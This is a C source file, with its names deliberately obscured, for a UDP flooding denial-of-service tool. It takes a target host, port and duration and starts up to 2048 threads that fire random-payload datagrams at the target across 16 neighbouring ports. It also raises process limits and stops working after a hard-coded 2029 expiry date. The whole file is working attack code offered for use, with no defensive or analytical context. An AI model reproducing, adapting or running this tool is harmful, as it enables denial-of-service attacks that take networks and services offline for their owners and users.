#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/resource.h>
#include <netinet/ip.h>
#include <fcntl.h>

#define A1 2029
#define A2 1
#define A3 10
#define A4 2048

typedef struct {
    unsigned int ipn;
    short pt;
    int dur, sz;
} b1;

volatile int b2 = 1;

void b3(int sig) { b2 = 0; }

unsigned int b4(unsigned int s) {
    return (s * 1664525 + 1013904223) & 0xFFFFFFFF;
}

int b5(unsigned int ipn, short pt, char*buf, int sz) {
    int s = socket(2,2,17);
    if(s < 0) return -1;
    int f=1; setsockopt(s,1,2,&f,sizeof(f));
    fcntl(s,2,1);
    struct sockaddr_in d;
    memset(&d,0,sizeof(d));
    d.sin_family=2;
    d.sin_port=htons(pt);
    d.sin_addr.s_addr=ipn;
    return sendto(s,buf,sz,1,(struct sockaddr*)&d,sizeof(d));
}

void *b6(void *data) {
    b1 *p = (b1*)data;
    char buf[8192];
    unsigned int seed = 0xCAFEBABE;
    while(b2) {
        int sz = p->sz;
        for(int i=0; i<sz; i++) {
            seed = b4(seed);
            buf[i] = (seed >> 24) & 0xFF;
        }
        int deadline = time(NULL) + p->dur;
        while(time(NULL) < deadline && b2) {
            if(b5(p->ipn, p->pt, buf, sz) < 0) {
                usleep(100);
                continue;
            }
            usleep(500);
        }
    }
    return NULL;
}

int main(int c, char **v) {
    struct rlimit r = {A4,A4};
    setrlimit(7,&r); setrlimit(8,&r);
    
    signal(2,b3);
    
    time_t t; time(&t);
    struct tm *tm = localtime(&t);
    
    if((tm->tm_year+1900 > A1) || ((tm->tm_year+1900 == A1) && ((tm->tm_mon+1 > A2) || ((tm->tm_mon+1 == A2) && tm->tm_mday > A3)))) {
        return 1;
    }
    
    if(c < 4) {
        printf("Use: %s <host> <port> <time> [size] [threads]\n", v[0]);
        return 1;
    }
    
    char host[16]; strncpy(host,v[1],15); host[15]=0;
    int port = atoi(v[2]), time_sec = atoi(v[3]);
    int pkt_size = (c>4 ? atoi(v[4]) : 1400);
    int num_threads = (c>5 ? atoi(v[5]) : A4);
    
    unsigned int ipn = inet_addr(host);
    if(ipn == 0xFFFFFFFF) return 1;
    
    pthread_t tids[A4];
    b1 config[A4];
    
    int vars[16] = {0,1,-1,2,-2,10,-10,20,-20,50,-50,100,-100,200,-200,0};
    
    int launched = 0;
    for(int i=0; i<16 && launched < num_threads; i++) {
        for(int j=0; j<num_threads/16 && launched < A4; j++) {
            config[launched].ipn = ipn;
            config[launched].pt = port + vars[i];
            config[launched].dur = time_sec;
            config[launched].sz = pkt_size;
            pthread_create(&tids[launched], 0, b6, &config[launched]);
            launched++;
        }
    }
    
    printf("Launch: %u:%d +16 vars = %d tasks\n", ipn, port, launched);
    
    sleep(time_sec + 5);
    b2 = 0;
    
    for(int i=0; i<launched; i++) {
        pthread_join(tids[i], NULL);
    }
    
    return 0;
}